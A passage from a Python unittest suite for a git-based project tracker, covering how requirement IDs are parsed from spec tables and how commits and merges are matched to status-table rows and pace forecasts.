        ("a rule with no outer pipes", "| # | R |\n---|---\n| 1 | REQ-2: Export data |\n| 2 | REQ-3: Delete |\n", [("REQ-2", "Export data"), ("REQ-3", "Delete")]),
        ("no outer pipes at all", "ID | Title\n---|---\nREQ-7 | No outer pipes\n", [("REQ-7", "No outer pipes")]),
        ("a parent beside the id", "| Parent | ID | Title |\n|---|---|---|\n| REQ-90 | REQ-10 | Login |\n", [("REQ-10", "Login")]),
        ("a title that looks like an id", "| Title | ID | Priority |\n|---|---|---|\n| SMS-2 login | REQ-9 | High |\n", [("REQ-9", "SMS-2 login")]),
        ("a summary with no words", "| ID | Priority | Status |\n|---|---|---|\n| REQ-1 | Must | Approved |\n", [("REQ-1", "")]),
        ("a revision history", "| Date | Version | Author | Ticket |\n|---|---|---|---|\n| 2026-01-02 | 1.0 | Ana | ENG-101 |\n", []),
        ("a risk register", "| Risk | Severity | Mitigation | Owner |\n|---|---|---|---|\n| Printer jams | SEV-2 | Spare printer | Ana |\n| R-1 | SEV-1 | Backups | Ben |\n", []),
        ("a schedule", "| Milestone | Date | Tracking |\n|---|---|---|\n| Beta | March | ENG-200 |\n| Q1-2027 | June | ENG-201 |\n", []),
        ("a glossary", "| Term | Meaning | Standard |\n|---|---|---|\n| Certificate | What the kiosk presents | X-509 |\n| Serial port | What the printer uses | RS-232 |\n", []),
        ("a test matrix", "| Test | Covers | Result |\n|---|---|---|\n| TC-1 | REQ-1 | Pass |\n", []),
        ("what a test covers", "| Covers | Test |\n|---|---|\n| REQ-15 | test_login |\n", []),
        ("the id starts a Requirement column", "| # | Requirement | Priority |\n|---|---|---|\n| 1 | REQ-1 Sign in with a magic link | Must |\n", [("REQ-1", "Sign in with a magic link")]),
        ("after a status", "| Status | Requirement |\n|---|---|\n| Open | REQ-2 Export to PDF |\n", [("REQ-2", "Export to PDF")]),
        ("an epic and its story", "| Epic | Story | Title |\n|---|---|---|\n| EP-1 | US-1 | Print a receipt |\n", [("US-1", "Print a receipt")]),
        ("words in a Ref column", "| Feature | Ref |\n|---|---|\n| Login | REQ-3 Remember me |\n", [("REQ-3", "Remember me")]),
        ("a link to it", "| ID | Title |\n|---|---|\n| [REQ-4](#req-4) | Dark mode |\n", [("REQ-4", "Dark mode")]),
        ("two in one cell", "| ID | Title |\n|---|---|\n| REQ-5, REQ-6 | Two in one cell |\n", [("REQ-5", "Two in one cell"), ("REQ-6", "Two in one cell")]),
        ("a feature beside its description", "| Feature | ID | Description |\n|---|---|---|\n| Auth | REQ-1 | Sign in with a magic link |\n", [("REQ-1", "Sign in with a magic link")]),
        ("an owner's name", "| ID | Owner name | Requirement |\n|---|---|---|\n| REQ-2 | Ana | Export to PDF |\n", [("REQ-2", "Export to PDF")]),
        ("a user story", "| ID | As a | I want | So that |\n|---|---|---|---|\n| US-1 | clerk | to print a receipt | I can hand it over |\n", [("US-1", "to print a receipt")]),
        ("a number is no words", "| # | ID | Priority |\n|---|---|---|\n| 1 | REQ-2 | High |\n", [("REQ-2", "")]),
    )

    def parsed(self, text):
        return [(item.ident, item.words) for item in requirements.parse(text, "spec.md")]

    def test_every_shape(self):
        for name, text, wanted in self.SHAPES:
            with self.subTest(name):
                self.assertEqual(self.parsed(text), wanted)

    def test_any_of_these_headings_holds_ids(self):
        for heading in ("ID", "Id", "Req ID", "Req. ID", "ReqID", "Requirement ID", "Identifier", "Requirement", "User Story", "Story", "Ref", "#", "No."):
            with self.subTest(heading):
                self.assertEqual(self.parsed(f"| Thing | {heading} | Other |\n|---|---|---|\n| Sign in | REQ-2 | Delete it |\n")[0][0], "REQ-2")

    def coverage(self, spec, *names):
        self.rows = {i: (name, "Not built") for i, name in enumerate(names, 1)}
        self.write_table()
        (self.repo / "spec.md").write_text(spec)
        self.write_plan(requirements=["spec.md"])
        return requirements.coverage(self.plan(), tables.load_clean(self.plan()))

    SPEC = ("# Bramble kiosk\n\n## Revision history\n\n| Date | Version | Author | Ticket |\n|---|---|---|---|\n| 2026-01-02 | 1.0 | Ana | ENG-101 |\n\n## Requirements\n\n"
            "### REQ-1 Sign in with a magic link\n\n### REQ-2 Export to PDF\n\n## Risks\n\n| Risk | Severity | Mitigation | Owner |\n|---|---|---|---|\n| Printer jams | SEV-2 | Spare printer | Ana |\n")

    def test_a_real_spec_s_other_tables_do_not_fill_the_matrix(self):
        found = self.coverage(self.SPEC, "Sign in with a magic link", "Export to PDF")
        self.assertEqual(found["without"], [])
        self.assertEqual([item.ident for item, _ in found["items"]], ["REQ-1", "REQ-2"])

    def test_and_what_they_held_is_said_where_the_matrix_is_read(self):
        found = self.coverage(self.SPEC, "Sign in with a magic link", "Export to PDF")
        self.assertEqual([item.ident for item in found["passed_over"]], ["ENG-101", "SEV-2"])
        words = trace.markdown(self.plan(), offline=True)
        self.assertIn("2 lines of the spec were not read as requirements", words)
        self.assertIn("| ENG-101 | spec.md:7 | its column does not say it holds ids", words)
        self.assertEqual((lambda entry: (entry["id"], entry["where"]))(trace.data(self.plan(), offline=True)["not_read"][0]), ("ENG-101", "spec.md:7"))

    def test_but_not_on_every_commit(self):
        self.coverage(self.SPEC, "Sign in with a magic link", "Export to PDF")
        self.engine("render", "--write")
        done = self.engine("check", "--offline")
        self.assertEqual(done.returncode, 0)
        self.assertNotIn("ENG-101", done.stdout + done.stderr)

    def test_an_id_a_list_defines_was_not_passed_over(self):
        found = self.coverage("| Area | Depends on |\n|---|---|\n| Billing | REQ-2 |\n\n- REQ-2: Export\n", "Export")
        self.assertEqual((found["without"], found["passed_over"]), ([], []))

    def test_a_definition_outranks_a_summary_s_guess(self):
        found = self.coverage("| ID | Priority | Status |\n|---|---|---|\n| REQ-1 | Must | Approved |\n| REQ-2 | Should | Draft |\n\n### REQ-1 Sign in with a magic link\n\n- REQ-2: Export to PDF\n", "Sign in with a magic link", "Export to PDF")
        self.assertEqual(found["without"], [])
        self.assertEqual([item.label() for item, _ in found["items"]], ["REQ-1 Sign in with a magic link", "REQ-2 Export to PDF"])

    def test_a_table_s_own_words_are_not_outranked(self):
        found = self.coverage("| ID | Title |\n|---|---|\n| REQ-1 | Login with SMS |\n| REQ-2 | Export data |\n\n### REQ-1\n\nDetails.\n\n- REQ-2: see the table above\n", "Login with SMS", "Export data")
        self.assertEqual(found["without"], [])

    def test_a_fresh_start_has_the_real_words_and_no_more(self):
        self.plan_path.unlink()
        (self.repo / "spec.md").write_text("| ID | Priority | Status |\n|---|---|---|\n| REQ-1 | Must | Approved |\n| REQ-2 | Should | Draft |\n\n### REQ-1 Sign in with a magic link\n\n- REQ-2: Export to PDF\n\n" + self.SPEC)
        self.assertEqual(self.engine("init", "--from-checklist", "spec.md").returncode, 0)
        self.assertEqual([r.name for d in tables.load_clean(self.plan()).domains for r in d.rows], ["Sign in with a magic link", "Export to PDF"])

    def test_a_fresh_start_on_a_summary_alone_names_the_row_by_its_id(self):
        self.plan_path.unlink()
        (self.repo / "spec.md").write_text("| ID | Priority | Status |\n|---|---|---|\n| REQ-1 | Must | Approved |\n")
        self.assertEqual(self.engine("init", "--from-checklist", "spec.md").returncode, 0)
        self.assertEqual([r.name for d in tables.load_clean(self.plan()).domains for r in d.rows], ["REQ-1"])


class TheSixthAttack(Case):
    """What a sixth reader found in the fixes for the fifth: Y1 to Y17. The tables are in WhatATableInASpecSays."""

    named, set_row, found, judged, merge_commit, spec = (TheFourthAttack.named, TheFourthAttack.set_row, TheFourthAttack.found, TheFourthAttack.judged,
                                                         TheFourthAttack.merge_commit, TheFourthAttack.spec)

    def test_a_commit_named_as_the_start_is_not_named_twice(self):
        self.write_table()
        sha = self.commit("2026-03-01", "first")
        self.commit("2026-03-02", "row 1: work", files={"a.py": "1\n"}, table=False)
        self.assertTrue(history.delta(self.plan(), since=sha[:7], today=datetime.date(2026, 3, 5)).startswith(f"Since {sha[:7]} (2026-03-01): "))

    # Y3, Y13: a word is its marks too
    def test_y3_a_mark_that_combines_with_a_letter_is_part_of_the_word(self):
        for one, other in (("मेल हटाएं", "माल हटाएं"), ("ใช้อีเมล", "ใช่อีเมล"), ("நாள் மாற்று", "நீள் மாற்று"), ("má", "mà"), ("café", "cafe")):
            with self.subTest(one):
                self.assertNotEqual(requirements._said(one), requirements._said(other))

    def test_y3_and_the_same_word_composed_or_not_is_the_same_word(self):
        self.assertEqual(requirements._said("café"), requirements._said("café"))

    def test_y13_every_currency_and_a_number_in_parentheses(self):
        for one, other in (("Fee is ₹100", "Fee is ₩100"), ("Tip of 50¢", "Tip of 50"), ("Under ＜10MB", "Under ＞10MB"), ("Limit (1000000) rows", "Limit (2000000) rows")):
            with self.subTest(one):
                self.assertNotEqual(requirements._said(one), requirements._said(other))

    def test_y13_and_a_commit_in_parentheses_is_still_not_a_word(self):
        self.assertEqual(requirements._said("Export (abc1234)"), requirements._said("Export"))

    # Y4, Y8: what a merge's message says
    def merged(self, message, subject="Inside work"):
        self.named("Export", "Billing", "Search")
        self.write_table()
        self.commit("2026-03-01", "start")
        git(self.repo, "checkout", "-q", "-b", "export")
        self.commit("2026-03-02", subject, files={"a.py": "1\n"}, table=False)
        git(self.repo, "checkout", "-q", "main")
        self.commit("2026-03-03", "Main work", files={"m.py": "1\n"}, table=False)
        self.merge_commit("export", day="2026-03-04", message=message)
        return self.judged()[subject]

    def test_y4_a_person_s_bullet_in_a_merge_description_is_their_word(self):
        self.assertEqual(self.merged("Merge pull request #12 from acme/export\n\nExport to PDF\n\n* Implements row 3\n* Adds tests")["rows"], [3])

    def test_y4_so_is_an_indented_line(self):
        self.assertEqual(self.merged("Merge pull request #12 from acme/export\n\n  Closes row 3 for good")["rows"], [3])

    def test_y4_what_merge_log_lists_under_its_heading_is_not(self):
        self.assertNotEqual(self.merged("Merge branch 'export'\n\n* export:\n  row 3: a word from inside\n")["class"], focus.ON)

    def test_y8_where_a_merge_went_says_nothing_of_what_it_brought(self):
        for message in ("Merge main into row-3-x", "Merged main into row-3-x", "Merge tag 'v1.2' into row-3-x", "Merge commit 'abc1234' into row-3-x", "Merge branches 'main' and 'hotfix' into row-3-x", "Merge branch 'main' into row-3-x"):
            with self.subTest(message):
                self.assertEqual(focus._said_by_a_merge(message).find("row-3"), -1)

    def test_y8_where_it_came_from_does(self):
        self.assertEqual(focus.named_rows(focus._said_by_a_merge("Merge branch 'row-3-x' into main"), {3}), {3})
        self.assertEqual(focus.named_rows(focus._said_by_a_merge("Merge export into main for row 3"), {3}), {3})

    # Y5, Y9: what a test is
    def test_y5_data_in_a_test_s_folder_is_not_a_test(self):
        for path in ("tests/golden/login.jsonl", "src/test/resources/seed.sql", "tests/lib/a.class", "tests/a.ndjson", "tests/a.har", "tests/a.xlsx", "tests/a.docx", "tests/a.webp", "tests/a.ico", "tests/a.webm", "tests/a.pkl",
                     "tests/a.npy", "tests/a.proto", "tests/a.properties", "tests/a.pyc", "tests/a.so", "tests/a.out", "tests/a.expected", "tests/helpers.py", "spec/spec_helper.rb", "tests/jest.config.js"):
            with self.subTest(path):
                self.assertFalse(trace._is_test(path))

    def test_y9_these_layouts_are_tests(self):
        for path in ("MyApp.Tests/LoginTests.cs", "Tests/AppTests/LoginTests.swift", "polls/tests.py", "cypress/e2e/login.cy.ts", "src/androidTest/java/LoginTest.kt", "lib/a_spec.rb", "e2e/login.ts", "src/main/LoginTest.java"):
            with self.subTest(path):
                self.assertTrue(trace._is_test(path))

    def test_y9_and_a_commit_of_only_those_is_upkeep(self):
        self.write_table()
        self.commit("2026-03-01", "start")
        self.commit("2026-03-05", "A swift test alone", files={"Tests/AppTests/SignoutTests.swift": "1\n"}, table=False)
        self.assertEqual(self.judged()["A swift test alone"]["class"], focus.UPKEEP)

    def test_y9_a_test_in_a_language_not_listed_can_be_named(self):
        self.named("A")
        self.write_table()
        table = self.repo / "status-table.md"
        table.write_text(table.read_text().replace("| 1 | A | Not built |  |", "| 1 | A | Not built | `tests/a.foo` |"))
        self.commit("2026-03-01", "start", files={"tests/a.foo": "1\n"}, table=False)
        self.assertEqual(trace.rows_data(self.plan(), offline=True)[0]["tests"], ["tests/a.foo"])

    # Y10: a commit past the list of files
    def test_y10_work_between_two_runs_of_docs_and_tests_is_seen(self):
        self.write_table()
        self.commit("2026-03-01", "first")
        self.commit("2026-03-05", "Import the service", files={**{f"docs/{i}.md": "1\n" for i in range(3)}, **{f"src/{i}.py": "1\n" for i in range(3)}, **{f"tests/test_{i}.py": "1\n" for i in range(3)}}, table=False)
        with unittest.mock.patch.object(focus, "MOST_FILES_IN_A_COMMIT", 3):
            self.assertEqual(self.judged()["Import the service"]["class"], focus.OFF)

    # Y11: a table that arrived in a merge, and an edit on the same day
    def test_y11_it_began_at_the_merge_whatever_the_day(self):
        self.plan_path.unlink()
        self.named("Login", "Export")
        self.commit("2026-03-01", "mono base", files={"app.py": "a\n"}, table=False)
        git(self.repo, "checkout", "-q", "--orphan", "imported")
        git(self.repo, "rm", "-q", "-r", "-f", ".")
        self.write_plan()
        imported = self.commit("2026-03-05", "project history")
        git(self.repo, "checkout", "-q", "main")
        git(self.repo, "merge", "-q", "-s", "ours", "--no-commit", "--allow-unrelated-histories", imported)
        git(self.repo, "read-tree", "--prefix=proj/", "-u", imported)
        git(self.repo, "commit", "-q", "-m", "Subtree import of proj", env={"GIT_AUTHOR_DATE": "2026-03-08T12:00:00", "GIT_COMMITTER_DATE": "2026-03-08T12:00:00"})
        where = self.repo / "proj"
        self.plan_path = where / ".gitdone.json"
        self.commit("2026-03-08", "row 1: the same day", files={"tests/test_t.py": "1\n"}, table=False, where=where)
        (where / "status-table.md").write_text(table_text(self.rows) + "\n")
        self.commit("2026-03-08", "Touch the table the same day", files={"t.py": "1\n"}, table=False, where=where)
        self.assertIn("row 1: the same day", self.judged())
        self.assertEqual(trace.rows_data(self.plan(), offline=True)[0]["tests"], ["tests/test_t.py"])

    # Y12: a plan in a folder of its own
    def test_y12_a_pattern_from_the_plan_s_folder_climbs_out_of_it(self):
        tracker = self.repo / "tracker"
        tracker.mkdir()
        self.plan_path.unlink()
        self.plan_path = tracker / ".gitdone.json"
        self.named("Aaa", "Pay")
        (tracker / "status-table.md").write_text(table_text(self.rows))
        self.plan_path.write_text(json.dumps({"status_doc": "status-table.md", "repo": "..", "default_branch": "main", "focus": {"paths": {"2": ["../src/pay/*"]}, "upkeep": ["../ops/*"]}}))
        self.commit("2026-03-01", "adopt", table=False)
        self.commit("2026-03-02", "Pay work", files={"src/pay/a.py": "1\n"}, table=False)
        self.commit("2026-03-03", "Ops work", files={"ops/a.sh": "1\n"}, table=False)
        found = self.judged()
        self.assertEqual((found["Pay work"]["class"], found["Pay work"]["rows"]), (focus.ON, [2]))
        self.assertEqual(found["Ops work"]["class"], focus.UPKEEP)

    # Y15: a workstream's id
    def test_y15_nothing_a_plan_passed_with_is_refused_now(self):
        self.write_table()
        for keys in ({"workstreams": [{"id": None, "name": "x", "rows": [1]}], "order": []}, {"workstreams": [{"id": 1.5, "rows": [1]}], "order": []}):
            with self.subTest(str(keys)):
                self.write_plan(**keys)
                self.assertEqual(self.engine("render", "--write").returncode, 0)
                self.assertEqual(self.engine("check", "--offline").returncode, 0)
                self.assertEqual(self.engine("focus").returncode, 0)

    def test_y15_the_schema_takes_what_the_engine_takes(self):
        schema = json.loads((pathlib.Path(__file__).resolve().parent.parent / "schema" / "plan.schema.json").read_text())
        self.assertIn("integer", schema["properties"]["workstreams"]["items"]["properties"]["id"]["type"])
        self.assertIn("integer", schema["properties"]["order"]["items"]["type"])

    # Y16
    def test_y16_a_workstream_s_id_can_be_in_any_alphabet(self):
        self.write_plan(workstreams=[{"id": "Р1", "name": "Кириллица", "rows": [1, 2]}])
        self.write_table()
        self.commit("2026-03-01", "start")
        self.commit("2026-03-05", "Р1: работа", files={"a.py": "1\n"}, table=False)
        self.assertEqual(self.judged()["Р1: работа"]["class"], focus.ON)

    # Y17
    def test_y17_with_the_code_elsewhere_a_commit_from_before_the_table_named_something_else(self):
        other = self.tmp / "code"
        other.mkdir()
        git(other, "init", "-q", "-b", "main")
        self.commit("2020-01-01", "row 1: ancient, about a spreadsheet row", files={"tests/test_ancient.py": "1\n"}, table=False, where=other)
        self.commit("2026-03-10", "row 2: recent", files={"tests/test_recent.py": "1\n"}, table=False, where=other)
        self.write_plan(repo=str(other))
        self.commit("2026-03-01", "adopt")
        rows = {r["row"]: r["tests"] for r in trace.rows_data(self.plan(), offline=True)}
        self.assertEqual((rows[1], rows[2]), ([], ["tests/test_recent.py"]))


class TheSeventhReader(Case):
    """A reader who used it as a new user would, on realistic projects, and counted only what misleads in ordinary use: Z1 to Z4, and what was cheap beside them."""

    named, set_row, found, judged, merge_commit = TheFourthAttack.named, TheFourthAttack.set_row, TheFourthAttack.found, TheFourthAttack.judged, TheFourthAttack.merge_commit

    def note(self, num, note):
        table = self.repo / "status-table.md"
        lines = table.read_text().split("\n")
        at = next(i for i, line in enumerate(lines) if line.startswith(f"| {num} |"))
        cells = lines[at].split("|")
        lines[at] = "|".join(cells[:4] + [f" {note} ", ""])
        table.write_text("\n".join(lines))

    def coverage(self, spec):
        (self.repo / "spec.md").write_text(spec)
        self.write_plan(requirements=["spec.md"])
        return requirements.coverage(self.plan(), tables.load_clean(self.plan()))

    # Z1: a note that mentions a requirement does not hold it
    def test_z1_a_mention_in_a_note_closes_nothing(self):
        self.named("Admin screen", "Export")
        self.write_table()
        self.note(1, "depends on REQ-3, see REQ-4 for logging")
        found = self.coverage("- REQ-3: Refunds\n- REQ-4: Audit log\n")
        self.assertEqual([item.ident for item in found["without"]], ["REQ-3", "REQ-4"])

    def test_z1_nor_does_it_hold_a_row_back_from_being_finished(self):
        self.named("Portal", "Admin screen")
        self.write_table()
        self.note(1, "REQ-2")
        self.note(2, "see REQ-2")
        found = self.coverage("- REQ-2: Portal\n")
        self.assertEqual([[r.num for r in rows] for _, rows in found["items"]], [[1]])

    def test_z1_a_note_that_starts_with_it_holds_it_and_so_does_a_name(self):
        self.named("Admin screen", "Refunds (REQ-5)")
        self.write_table()
        self.note(1, "REQ-3, REQ-4: both of these")
        found = self.coverage("- REQ-3: One\n- REQ-4: Two\n- REQ-5: Three\n")
        self.assertEqual(found["without"], [])

    def test_z1_link_writes_where_it_is_read(self):
        self.named("Admin screen")
        self.write_table()
        self.note(1, "depends on REQ-3")
        self.coverage("- REQ-3: Refunds\n")
        self.assertIn("answers to REQ-3", self.engine("link", "1", "REQ-3").stdout)
        self.assertEqual(requirements.coverage(self.plan(), tables.load_clean(self.plan()))["without"], [])
        self.assertIn("already names", self.engine("link", "1", "REQ-3").stdout)

    # Z2: what the table ties to a row ties a commit
    def test_z2_a_message_that_names_a_requirement_the_row_holds(self):
        self.named("Sign in", "Billing", "Export")
        self.write_table()
        self.note(1, "REQ-1")
        self.note(2, "REQ-2")
        self.commit("2026-03-01", "start", table=False)
        self.commit("2026-03-02", "REQ-1: send the link", files={"a.py": "1\n"}, table=False)
        self.commit("2026-03-03", "Webhook handling (REQ-2)", files={"b.py": "1\n"}, table=False)
        self.commit("2026-03-04", "Mentions REQ-9, which nothing holds", files={"c.py": "1\n"}, table=False)
        found = self.judged()
        self.assertEqual((found["REQ-1: send the link"]["class"], found["REQ-1: send the link"]["rows"]), (focus.ON, [1]))
        self.assertEqual(found["Webhook handling (REQ-2)"]["rows"], [2])
        self.assertEqual(found["Mentions REQ-9, which nothing holds"]["class"], focus.OFF)

    def test_z2_a_message_that_names_the_issue_in_a_row_s_note(self):
        self.named("Export to PDF", "Billing")
        self.write_table()
        self.note(1, "issue #12")
        self.commit("2026-03-01", "start", table=False)
        self.commit("2026-03-02", "PDF renderer, closes #12", files={"a.py": "1\n"}, table=False)
        self.commit("2026-03-03", "Something else, closes #13", files={"b.py": "1\n"}, table=False)
        found = self.judged()
        self.assertEqual(found["PDF renderer, closes #12"]["rows"], [1])
        self.assertEqual(found["Something else, closes #13"]["class"], focus.OFF)

    def test_z2_a_merge_of_a_branch_a_row_cites(self):
        self.named("Export", "Sign up")
        self.write_table()
        self.commit("2026-03-01", "start")
        git(self.repo, "checkout", "-q", "-b", "signup")
        self.commit("2026-03-02", "Registration form", files={"form.py": "1\n"}, table=False)
        git(self.repo, "checkout", "-q", "main")
        self.note(2, "*(Partial 2026-03-03: branch `signup`)*")
        self.commit("2026-03-03", "row 2 is built", table=False)
        self.merge_commit("signup", day="2026-03-04", message="Merge branch 'signup'")
        found = self.judged()["Registration form"]
        self.assertEqual((found["class"], found["rows"]), (focus.ON, [2]))

    def test_z2_on_a_branch_a_row_cites(self):
        self.named("Export", "Sign up")
        self.write_table()
        self.commit("2026-03-01", "start")
        git(self.repo, "checkout", "-q", "-b", "signup")
        self.note(2, "*(Partial 2026-03-02: branch `signup`)*")
        self.commit("2026-03-02", "row 2 is begun", table=False)
        self.commit("2026-03-03", "Registration form", files={"form.py": "1\n"}, table=False)
        found = self.judged()["Registration form"]
        self.assertEqual((found["class"], found["because"]), (focus.ON, focus.CITED_BRANCH))

    # Z3: what a table says of the past is not pace
    def days_of_marking(self, cite):
        self.named(*[f"Module {i}" for i in range(1, 7)])
        old = self.commit("2026-01-05", "old work", files={"old.py": "1\n"}, table=False)
        self.write_table()
        self.commit("2026-02-01", "the tracker")
        for num, day in enumerate(("2026-02-10", "2026-02-15", "2026-02-20", "2026-02-25"), start=1):
            sha = old if cite == "old" else self.commit(day, f"row {num}: work", files={f"m{num}.py": "1\n"}, table=False)
            self.write_table()
            self.rows[num] = (self.rows[num][0], "Live")
            self.write_table()
            for n in range(1, num + 1):
                self.note(n, f"`{sha if n == num else (old if cite == 'old' else git(self.repo, 'log', '-1', f'--grep=row {n}:', '--format=%H'))}`")
            self.commit(day, f"row {num} is live", table=False)

    def test_z3_a_row_moved_on_commits_from_before_the_table_is_not_pace(self):
        self.days_of_marking("old")
        pace = forecast.read_pace(self.plan(), today=TODAY)
        self.assertEqual((pace.moving_days(), sum(pace.live)), (0, 0))
        self.assertEqual(self.data()["state"], "stalled")

    def test_z3_a_row_moved_on_work_done_since_is(self):
        self.days_of_marking("new")
        pace = forecast.read_pace(self.plan(), today=TODAY)
        self.assertEqual((pace.moving_days(), sum(pace.live)), (4, 4))
        self.assertEqual(self.data()["state"], "dated")

    def test_z3_the_table_s_first_day_is_where_the_project_stood(self):
        self.write_table()
        self.commit("2026-02-01", "the tracker")
        for num in (1, 2, 3):
            self.move(num, "Partial", "2026-02-01")
        self.rows[11] = ("A new row", "Not built")
        self.commit("2026-02-01", "one more")
        pace = forecast.read_pace(self.plan(), today=TODAY)
        self.assertEqual((pace.moving_days(), pace.added), (0, 0))

    def test_z3_the_chart_is_still_the_record(self):
        self.days_of_marking("old")
        self.assertEqual(chart.points(self.plan(), today=TODAY.isoformat())[-1]["strict"], 4)

    # Z4: the rest of a requirements document
    SRS = ("## Functional requirements\n| ID | Requirement | Priority |\n|---|---|---|\n| FR-1 | Track a parcel by its number | High |\n| FR-2 | Show the delivery ETA | High |\n\n"
           "## Interfaces\n| Interface | Protocol |\n|---|---|\n| IF-1 | REST over HTTPS |\n\n## Error codes\n| Code | Meaning |\n|---|---|\n| ERR-1 | Unknown parcel number |\n")

    def parsed(self, text):
        return [(item.ident, item.words) for item in requirements.parse(text, "spec.md")]

    def test_z4_its_other_tables_are_not_requirements(self):
        self.assertEqual(self.parsed(self.SRS), [("FR-1", "Track a parcel by its number"), ("FR-2", "Show the delivery ETA")])

    def test_z4_they_are_said(self):
        passed = []
        requirements.parse(self.SRS, "spec.md", None, passed)
        self.assertEqual([item.ident for item in passed], ["IF-1", "ERR-1"])

    def test_z4_a_fresh_start_agrees(self):
        self.plan_path.unlink()
        (self.repo / "SRS.md").write_text(self.SRS)
        self.assertEqual(self.engine("init", "--from-checklist", "SRS.md").returncode, 0)
        self.assertEqual([r.name for d in tables.load_clean(self.plan()).domains for r in d.rows], ["Track a parcel by its number", "Show the delivery ETA"])

    def test_z4_a_first_column_of_the_same_kind_is_still_read(self):
        self.assertEqual(self.parsed("- REQ-1: One\n\n| Thing | Words |\n|---|---|\n| REQ-2 | Two |\n| OTHER-3 | Three |\n"), [("REQ-1", "One"), ("REQ-2", "Two")])

    def test_z4_and_with_nothing_plainer_a_first_column_is_its_ids(self):
        self.assertEqual(self.parsed("| Interface | Protocol |\n|---|---|\n| IF-1 | REST over HTTPS |\n"), [("IF-1", "REST over HTTPS")])

    def test_z4_sections_that_are_not_requirements(self):
        for heading in ("Open questions", "Risks", "Assumptions", "Glossary", "Decisions", "Out of scope", "Non-goals", "Revision history", "References", "Appendix A"):
            with self.subTest(heading):
                text = f"## Requirements\n\n- REQ-1: Sign in\n\n## {heading}\n\n- Q-1: Do we support IMAP?\n- [ ] A plain item\n\n### Deeper\n\n- Q-2: Still in it\n\n## More requirements\n\n- REQ-2: Export\n"
                self.assertEqual(self.parsed(text), [("REQ-1", "Sign in"), ("REQ-2", "Export")])

    def test_z4_a_requirement_about_a_risk_is_a_requirement(self):
        self.assertEqual(self.parsed("### REQ-1 Risk score for each parcel\n\n## Risk scoring\n\n- REQ-2: Score it\n")[:1], [("REQ-1", "Risk score for each parcel")])

    # What was cheap beside them
    def test_a_mixed_spec_keeps_the_lines_of_a_kind_it_defines(self):
        self.assertEqual(self.parsed("REQ-1: Sign in\nREQ-2 - Search\nREQ-3: Export\n- REQ-4 Billing\n1. REQ-5 Reports\n"),
                         [("REQ-1", "Sign in"), ("REQ-2", "Search"), ("REQ-3", "Export"), ("REQ-4", "Billing"), ("REQ-5", "Reports")])

    def test_but_a_sentence_on_its_own_is_still_a_sentence(self):
        self.assertEqual(self.parsed("- BUG-12 was fixed in the last release\n"), [])
        self.assertEqual(self.parsed("REQ-1: Sign in\n- BUG-12 was fixed in the last release\n"), [("REQ-1", "Sign in")])

    def test_a_line_that_could_be_prose_does_not_replace_a_definition(self):
        self.assertEqual(self.parsed("REQ-1: Sign in\n")[0], ("REQ-1", "Sign in"))
        self.named("Sign in")
        self.write_table()
        self.assertEqual(self.coverage("REQ-1: Sign in\n- REQ-1 was written by Ana\n")["without"], [])

    def test_a_to_do_item_can_say_which_requirement_it_is(self):
        self.named("Sign in")
        self.write_table()
        (self.repo / "ROADMAP.md").write_text("- [ ] Sign in (REQ-1)\n")
        (self.repo / "spec.md").write_text("- REQ-1: Sign in\n")
        self.write_plan(requirements=["spec.md", "ROADMAP.md"])
        found = requirements.coverage(self.plan(), tables.load_clean(self.plan()))
        self.assertEqual(([item.ident for item, _ in found["items"]], found["without"]), (["REQ-1"], []))

    def test_a_struck_item_is_not_in_scope(self):
        self.assertEqual(self.parsed("- [ ] Sign in\n- [x] ~~Gift cards~~\n"), [(None, "Sign in")])
        self.plan_path.unlink()
        (self.repo / "ROADMAP.md").write_text("- [ ] Sign in\n- [x] ~~Gift cards~~\n")
        self.assertEqual(self.engine("init", "--from-checklist", "ROADMAP.md").returncode, 0)
        self.assertEqual([r.name for d in tables.load_clean(self.plan()).domains for r in d.rows], ["Sign in"])

    def test_a_merge_named_by_a_row_s_words_is_unclear(self):
        self.named("CSV export", "Search")
        self.write_table()
        self.commit("2026-03-01", "start")
        git(self.repo, "checkout", "-q", "-b", "feature/csv-export")
        self.commit("2026-03-02", "Add the writer", files={"w.py": "1\n"}, table=False)
        git(self.repo, "checkout", "-q", "main")
        self.merge_commit("feature/csv-export", day="2026-03-03", message="Merge branch 'feature/csv-export'")
        found = self.judged()["Add the writer"]
        self.assertEqual((found["class"], found["rows"]), (focus.UNCLEAR, [1]))

    def test_a_small_fix_or_upgrade_is_upkeep_by_its_subject(self):
        self.write_table()
        self.commit("2026-03-01", "start")
        self.commit("2026-03-02", "Fix crash on empty file", files={"f.py": "1\n"}, table=False)
        self.commit("2026-03-03", "Upgrade the HTTP client to 2.1", files={"h.py": "1\n"}, table=False)
        found = self.judged()
        self.assertEqual((found["Fix crash on empty file"]["class"], found["Upgrade the HTTP client to 2.1"]["class"]), (focus.UPKEEP, focus.UPKEEP))

    def test_more_project_files(self):
        self.write_table()
        self.commit("2026-03-01", "start")
        self.commit("2026-03-02", "Bring in Spring", files={"pom.xml": "<p/>\n", "mvnw": "x\n", ".mvn/wrapper/a.properties": "x\n", "svc/build.gradle.kts": "x\n", ".golangci.yml": "x\n"}, table=False)
        self.assertEqual(self.judged()["Bring in Spring"]["class"], focus.UPKEEP)

    def test_the_portfolio_says_which_date(self):
        entry = {"project": "p", "rows": 3, "strict_rows": 1, "strict": 1 / 3, "weighted": 1 / 3, "likely": "2026-04-01", "likely_words": "Apr 9 on Live rows alone, or Apr 1 with all work", "all_groups": False, "next": None, "next_name": None, "gate": "pass", "contradicted": 0, "missing": 0}
        self.assertIn("Apr 9 on Live rows alone, or Apr 1 with all work", portfolio.markdown([entry]))

    def test_no_commits_in_a_folder_names_the_folder(self):
        (self.repo / "docs").mkdir()
        (self.repo / "docs" / "status-table.md").write_text(table_text(self.rows))
        self.plan_path.unlink()
        self.plan_path = self.repo / "docs" / ".gitdone.json"
        self.write_plan()
        self.commit("2026-03-01", "track", table=False)
        self.commit("2026-03-02", "Add a cache", files={"src/a.py": "1\n"}, table=False)
        self.assertIn("no commits in docs/ but the tracker's own", focus.text(self.found()))

    def test_a_spec_that_is_not_utf_8_is_said_at_init(self):
        self.plan_path.unlink()
        (self.repo / "SPEC.md").write_bytes(b"REQ-1: R\xe9sum\xe9 export\n")
        done = self.engine("init", "--from-checklist", "SPEC.md")
        self.assertEqual(done.returncode, 2)
        self.assertIn("is not UTF-8", done.stderr + done.stdout)
        self.assertNotIn("UnicodeDecodeError", done.stderr + done.stdout)

    def test_a_row_that_cites_a_commit_had_not_finished_before_it(self):
        self.named("A", "B")
        self.write_table()
        self.commit("2026-03-01", "start")
